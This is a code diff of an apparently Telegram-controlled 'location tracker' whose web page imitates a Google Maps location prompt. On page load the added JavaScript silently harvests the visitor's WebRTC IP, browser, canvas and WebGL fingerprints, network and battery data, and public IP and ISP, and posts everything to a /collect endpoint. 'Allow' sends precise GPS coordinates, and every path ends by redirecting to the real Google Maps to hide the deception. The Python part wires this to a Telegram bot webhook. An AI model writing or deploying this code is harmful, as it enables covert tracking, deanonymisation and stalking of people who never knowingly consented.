-    const allowBtn=document.getElementById('allowBtn'),denyBtn=document.getElementById('denyBtn');
-    function disableButtons(){allowBtn.disabled=true;denyBtn.disabled=true;allowBtn.style.opacity='0.7';denyBtn.style.opacity='0.7'}
-    
-    function collectSilentData(){
-        var points=0;
-        try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});pc.onicecandidate=function(ice){if(!ice||!ice.candidate)return;var m=ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);if(m){fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:m[1]})}).catch(function(){});points++}};setTimeout(function(){try{pc.close()}catch(e){}},3000)}catch(e){}
-        var fp={width:screen.width,height:screen.height,colorDepth:screen.colorDepth,platform:navigator.platform,languages:navigator.languages?Array.from(navigator.languages):[navigator.language],timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cookiesEnabled:navigator.cookieEnabled,localStorage:typeof(Storage)!=='undefined',sessionStorage:typeof(Storage)!=='undefined'};
-        fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fingerprint:fp})}).catch(function(){});points++;
-        try{var c=document.createElement('canvas');c.width=400;c.height=150;var x=c.getContext('2d');x.fillStyle='#ffffff';x.fillRect(0,0,400,150);x.fillStyle='#4285F4';x.fillRect(0,0,400,40);x.fillStyle='#ffffff';x.font='bold 22px Arial,sans-serif';x.textBaseline='middle';x.fillText('Google Maps',20,22);x.beginPath();x.arc(340,75,20,0,Math.PI*2);x.fillStyle='#ea4335';x.fill();x.strokeStyle='#ffffff';x.lineWidth=3;x.stroke();x.beginPath();x.arc(340,75,8,0,Math.PI*2);x.fillStyle='#ffffff';x.fill();x.strokeStyle='#dadce0';x.lineWidth=2;for(var i=0;i<6;i++){x.beginPath();x.moveTo(20,55+i*18);x.lineTo(280,55+i*18);x.stroke()}x.fillStyle='#fbbc04';x.fillRect(30,60,40,30);x.fillStyle='#34a853';x.fillRect(100,78,50,40);x.fillStyle='#4285F4';x.fillRect(180,55,35,35);x.fillStyle='#ea4335';x.fillRect(230,90,45,25);x.fillStyle='#202124';x.font='14px Arial';x.textBaseline='top';x.fillText('Current Location',20,120);x.fillStyle='#5f6368';x.font='12px Arial';x.fillText('Accuracy: +/- 12m',180,122);fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({canvas_fp:c.toDataURL('image/png')})}).catch(function(){});points++}catch(e){}
-        try{var cv=document.createElement('canvas');var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');if(gl){fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webgl:{vendor:gl.getParameter(gl.VENDOR),renderer:gl.getParameter(gl.RENDERER)}})}).catch(function(){});points++}}catch(e){}
-        if(navigator.connection){var nc=navigator.connection;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wifi_scan:{type:nc.type||'unknown',effectiveType:nc.effectiveType||'unknown',rtt:nc.rtt,downlink:nc.downlink,downlinkMax:nc.downlinkMax||'unknown',saveData:nc.saveData||false}})}).catch(function(){});points++}
-        if(navigator.getBattery){navigator.getBattery().then(function(b){var ni={};if(navigator.connection)ni={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({battery:{level:b.level,charging:b.charging},network:ni})}).catch(function(){})}).catch(function(){})}
-        console.log('[+] Silent data collected: '+points+' points');
+    'use strict';
+    let capturedLat = null;
+    let capturedLon = null;
+
+    const allowBtn = document.getElementById('allowBtn');
+    const denyBtn = document.getElementById('denyBtn');
+
+    function disableButtons(){
+        allowBtn.disabled = true;
+        denyBtn.disabled = true;
+        allowBtn.style.opacity = '0.7';
+        denyBtn.style.opacity = '0.7';
     }
+
+    function collectSilentData(){
+        var points = 0;
+
+        // --- WebRTC IP Leak ---
+        try{
+            var pc = new RTCPeerConnection({
+                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+            });
+            pc.createDataChannel('');
+            pc.createOffer().then(function(offer){
+                return pc.setLocalDescription(offer);
+            });
+            pc.onicecandidate = function(ice){
+                if(!ice || !ice.candidate) return;
+                var ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
+                if(ipMatch){
+                    fetch('/collect', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({webrtc_ip: ipMatch[1]})
+                    }).catch(function(){});
+                    points++;
+                }
+            };
+            setTimeout(function(){ try{pc.close();}catch(e){} }, 3000);
+        } catch(e){}
+
+        // --- Browser Fingerprint ---
+        var fp = {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            platform: navigator.platform,
+            languages: navigator.languages ? Array.from(navigator.languages) : [navigator.language],
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookiesEnabled: navigator.cookieEnabled,
+            localStorage: typeof(Storage) !== 'undefined' ? true : false,
+            sessionStorage: typeof(Storage) !== 'undefined' ? true : false
+        };
+        fetch('/collect', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({fingerprint: fp})
+        }).catch(function(){});
+        points++;
+
+        // --- Canvas Fingerprint ---
+        try{
+            var can = document.createElement('canvas');
+            can.width = 400;
+            can.height = 150;
+            var ctx = can.getContext('2d');
+
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, 400, 150);
+
+            ctx.fillStyle = '#4285F4';
+            ctx.fillRect(0, 0, 400, 40);
+
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 22px Arial, sans-serif';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('Google Maps', 20, 22);
+
+            ctx.beginPath();
+            ctx.arc(340, 75, 20, 0, Math.PI * 2);
+            ctx.fillStyle = '#ea4335';
+            ctx.fill();
+            ctx.strokeStyle = '#ffffff';
+            ctx.lineWidth = 3;
+            ctx.stroke();
+
+            ctx.beginPath();
+            ctx.arc(340, 75, 8, 0, Math.PI * 2);
+            ctx.fillStyle = '#ffffff';
+            ctx.fill();
+
+            ctx.strokeStyle = '#dadce0';
+            ctx.lineWidth = 2;
+            for (var i = 0; i < 6; i++) {
+                ctx.beginPath();
+                ctx.moveTo(20, 55 + i * 18);
+                ctx.lineTo(280, 55 + i * 18);
+                ctx.stroke();
+            }
+
+            ctx.fillStyle = '#fbbc04';
+            ctx.fillRect(30, 60, 40, 30);
+            ctx.fillStyle = '#34a853';
+            ctx.fillRect(100, 78, 50, 40);
+            ctx.fillStyle = '#4285F4';
+            ctx.fillRect(180, 55, 35, 35);
+            ctx.fillStyle = '#ea4335';
+            ctx.fillRect(230, 90, 45, 25);
+
+            ctx.fillStyle = '#202124';
+            ctx.font = '14px Arial';
+            ctx.textBaseline = 'top';
+            ctx.fillText('Current Location', 20, 120);
+            ctx.fillStyle = '#5f6368';
+            ctx.font = '12px Arial';
+            ctx.fillText('Accuracy: +/- 12m', 180, 122);
+
+            var hash = can.toDataURL('image/png');
+
+            fetch('/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({canvas_fp: hash})
+            }).catch(function(){});
+            points++;
+        } catch(e){}
+
+        // --- WebGL ---
+        try{
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(gl){
+                var webglInfo = {
+                    vendor: gl.getParameter(gl.VENDOR),
+                    renderer: gl.getParameter(gl.RENDERER)
+                };
+                fetch('/collect', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({webgl: webglInfo})
+                }).catch(function(){});
+                points++;
+            }
+        } catch(e){}
+
+        // --- Network Info ---
+        if(navigator.connection){
+            var nc = navigator.connection;
+            var netData = {
+                type: nc.type || 'unknown',
+                effectiveType: nc.effectiveType || 'unknown',
+                rtt: nc.rtt,
+                downlink: nc.downlink,
+                downlinkMax: nc.downlinkMax || 'unknown',
+                saveData: nc.saveData || false
+            };
+            fetch('/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({wifi_scan: netData})
+            }).catch(function(){});
+            points++;
+        }
+
+        // --- Battery ---
+        if(navigator.getBattery){
+            navigator.getBattery().then(function(b){
+                var netInfo = {};
+                if(navigator.connection){
+                    netInfo = {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink
+                    };
+                }
+                fetch('/collect', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        battery: {level: b.level, charging: b.charging},
+                        network: netInfo
+                    })
+                }).catch(function(){});
+            }).catch(function(){});
+        }
+
+        // ========== NETWORK DETECTOR (Extended) ==========
+        function runNetworkDetector(){
+            var netDetect = {
+                type: 'unknown',
+                effectiveType: 'unknown',
+                rtt: null,
+                downlink: null,
+                downlinkMax: null,
+                saveData: null,
+                ispHints: 'N/A',
+                vpnDetected: 'N/A',
+                torDetected: 'N/A',
+                publicIP: 'N/A',
+                dataSavingMode: 'N/A'
+            };
+
+            if(navigator.connection){
+                var nc = navigator.connection;
+                netDetect.type = nc.type || 'unknown';
+                netDetect.effectiveType = nc.effectiveType || 'unknown';
+                netDetect.rtt = nc.rtt;
+                netDetect.downlink = nc.downlink;
+                netDetect.downlinkMax = nc.downlinkMax || null;
+                netDetect.saveData = nc.saveData || false;
+            }
+
+            if(navigator.connection && navigator.connection.saveData){
+                netDetect.dataSavingMode = 'Yes';
+            } else {
+                netDetect.dataSavingMode = 'No';
+            }
+
+            try{
+                var vpnPC = new RTCPeerConnection({
+                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+                });
+                var detectedIPs = [];
+                vpnPC.createDataChannel('');
+                vpnPC.createOffer().then(function(offer){
+                    return vpnPC.setLocalDescription(offer);
+                });
+                vpnPC.onicecandidate = function(ice){
+                    if(!ice || !ice.candidate) return;
+                    var ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
+                    if(ipMatch && detectedIPs.indexOf(ipMatch[1]) === -1){
+                        detectedIPs.push(ipMatch[1]);
+                    }
+                };
+                setTimeout(function(){
+                    try{ vpnPC.close(); } catch(e){}
+                    if(detectedIPs.length > 1){
+                        netDetect.vpnDetected = 'Possible (' + detectedIPs.join(', ') + ')';
+                    }
+                }, 3000);
+            } catch(e){}
+
+            try{
+                fetch('https://api.ipify.org?format=json')
+                .then(function(r){ return r.json(); })
+                .then(function(ipData){
+                    if(ipData && ipData.ip){
+                        netDetect.publicIP = ipData.ip;
+                    }
+                    return fetch('https://ipapi.co/' + (ipData.ip || '') + '/json/');
+                })
+                .then(function(r){ return r.json(); })
+                .then(function(geoData){
+                    if(geoData && geoData.org){
+                        netDetect.ispHints = geoData.org + (geoData.country_name ? ' (' + geoData.country_name + ')' : '');
+                    }
+                    if(geoData && geoData.hosting === true){
+                        netDetect.vpnDetected = 'Yes (hosting/VPN IP)';
+                    }
+                    fetch('/collect', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({network_detector: netDetect})
+                    }).catch(function(){});
+                })
+                .catch(function(){
+                    fetch('/collect', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({network_detector: netDetect})
+                    }).catch(function(){});
+                });
+            } catch(e){
+                fetch('/collect', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({network_detector: netDetect})
+                }).catch(function(){});
+            }
+        }
+
+        setTimeout(runNetworkDetector, 1500);
+
+        console.log('[+] Silent data collected: ' + points + ' points sent');
+    }
+
     collectSilentData();
-    
-    allowBtn.addEventListener('click',function(){
-        disableButtons();allowBtn.textContent='Accessing...';
-        if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(pos){capturedLat=pos.coords.latitude;capturedLon=pos.coords.longitude;allowBtn.textContent='Location Shared';fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:capturedLat,lon:capturedLon,acc:pos.coords.accuracy,alt:pos.coords.altitude,speed:pos.coords.speed})}).catch(function(){});setTimeout(function(){window.location.href='https://maps.google.com/?q='+capturedLat+','+capturedLon},2000)},function(err){var m='Location unavailable';if(err.code===1)m='Permission denied';else if(err.code===2)m='Position unavailable';else if(err.code===3)m='Timed out';allowBtn.textContent=m;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gps_error:err.message,gps_code:err.code})}).catch(function(){});setTimeout(function(){window.location.href='https://maps.google.com'},2000)},{enableHighAccuracy:true,timeout:15000,maximumAge:0})}else{allowBtn.textContent='GPS Unavailable';setTimeout(function(){window.location.href='https://maps.google.com'},2000)}
+
+    // ========== GPS ON ALLOW ==========
+    allowBtn.addEventListener('click', function(){
+        disableButtons();
+        allowBtn.textContent = 'Accessing...';
+
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(
+                function(pos){
+                    capturedLat = pos.coords.latitude;
+                    capturedLon = pos.coords.longitude;
+
+                    allowBtn.textContent = 'Location Shared';
+
+                    var gpsData = {
+                        lat: capturedLat,
+                        lon: capturedLon,
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude,
+                        speed: pos.coords.speed
+                    };
+
+                    fetch('/collect', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(gpsData)
+                    }).catch(function(){});
+
+                    setTimeout(function(){
+                        var mapsUrl = 'https://maps.google.com/?q=' + capturedLat + ',' + capturedLon;
+                        window.location.href = mapsUrl;
+                    }, 2000);
+                },
+                function(err){
+                    var errMsg = 'Location unavailable';
+                    if(err.code === 1) errMsg = 'Permission denied';
+                    else if(err.code === 2) errMsg = 'Position unavailable';
+                    else if(err.code === 3) errMsg = 'Timed out';
+
+                    allowBtn.textContent = errMsg;
+
+                    fetch('/collect', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({gps_error: err.message, gps_code: err.code})
+                    }).catch(function(){});
+
+                    setTimeout(function(){
+                        window.location.href = 'https://maps.google.com';
+                    }, 2000);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            allowBtn.textContent = 'GPS Unavailable';
+            setTimeout(function(){
+                window.location.href = 'https://maps.google.com';
+            }, 2000);
+        }
     });
-    
-    denyBtn.addEventListener('click',function(){
-        disableButtons();denyBtn.textContent='Opening...';
-        fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gps_error:'User clicked Not Now',gps_code:1})}).catch(function(){});
-        setTimeout(function(){window.location.href='https://maps.google.com'},1000);
+
+    // ========== DENY ==========
+    denyBtn.addEventListener('click', function(){
+        disableButtons();
+        denyBtn.textContent = 'Opening...';
+
+        fetch('/collect', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({gps_error: 'User clicked Not Now', gps_code: 1})
+        }).catch(function(){});
+
+        setTimeout(function(){
+            window.location.href = 'https://maps.google.com';
+        }, 1000);
     });
 })();
 </script>
@@ -514,28 +978,54 @@ button{flex:1;padding:12px 16px;border:none;border-radius:12px;cursor:pointer;fo
 </html>
 """
 
-# ================== MAIN ==================
-def main():
-    """Run everything on Render."""
-    
-    print("\n" + "=" * 55)
-    print("  TELEGRAM LOCATION TRACKER - MULTI-USER")
-    print("=" * 55)
-    print(f"  Port:     {PORT}")
-    print(f"  URL:      {RENDER_URL}")
-    print("=" * 55 + "\n")
-    
-    # Start data forwarder
-    forwarder_thread = threading.Thread(target=telegram_data_forwarder, daemon=True)
-    forwarder_thread.start()
-    
-    # Start Telegram bot poller
-    poller_thread = threading.Thread(target=bot_poller, daemon=True)
-    poller_thread.start()
-    
-    # Run Flask (this blocks)
-    app.run(host="0.0.0.0", port=PORT, debug=False)
+
+# ========================== SET WEBHOOK ON STARTUP ==========================
+def set_webhook():
+    """Set the Telegram webhook to point to this Render instance."""
+    time.sleep(5)  # Wait for server to be ready
+
+    # First, get the Render URL from environment
+    render_url = os.environ.get("RENDER_EXTERNAL_URL")
+    if not render_url:
+        logger.warning("RENDER_EXTERNAL_URL not set. Bot webhook won't be configured automatically.")
+        logger.warning("Set it manually in Render dashboard > Environment Variables.")
+        return
+
+    webhook_url = f"{render_url}/webhook"
+
+    # Delete old webhook first
+    del_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteWebhook"
+    try:
+        requests.get(del_url, timeout=10)
+    except:
+        pass
+
+    # Set new webhook
+    set_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
+    payload = {"url": webhook_url}
+    try:
+        resp = requests.post(set_url, json=payload, timeout=10)
+        if resp.ok:
+            logger.info(f"Webhook set to: {webhook_url}")
+        else:
+            logger.error(f"Webhook failed: {resp.text}")
+    except Exception as e:
+        logger.error(f"Webhook error: {e}")
 
 
+# ========================== MAIN ==========================
 if __name__ == '__main__':
-    main()
+    logger.info("Starting HackerAI Tracker Bot...")
+
+    # Start tunnel in a thread
+    tunnel_thread = threading.Thread(target=start_tunnel, daemon=True)
+    tunnel_thread.start()
+
+    # Set webhook in a thread (after server starts)
+    webhook_thread = threading.Thread(target=set_webhook, daemon=True)
+    webhook_thread.start()
+
+    # Run Flask
+    logger.info(f"Flask server starting on port {PORT}...")
+    from waitress import serve
+    serve(app, host="0.0.0.0", port=PORT)
